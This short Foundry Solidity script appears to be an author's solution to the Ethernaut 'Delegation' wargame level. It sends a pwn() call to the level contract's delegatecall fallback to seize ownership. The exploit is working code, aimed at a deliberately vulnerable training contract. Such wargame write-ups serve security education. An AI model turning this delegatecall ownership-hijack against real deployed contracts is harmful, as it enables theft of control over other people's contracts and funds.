// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Delegation} from "src/06/Delegation.sol";


contract Exploit is Script {

        address instance = 0x336a9B16f89367082e234E0eeAeE9a3Bf61caeEE;
        Delegation level = Delegation(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            (bool success, ) = address(level).call(
                abi.encodeWithSignature("pwn()")
            );
            require(success);
            
            vm.stopBroadcast();
    }
}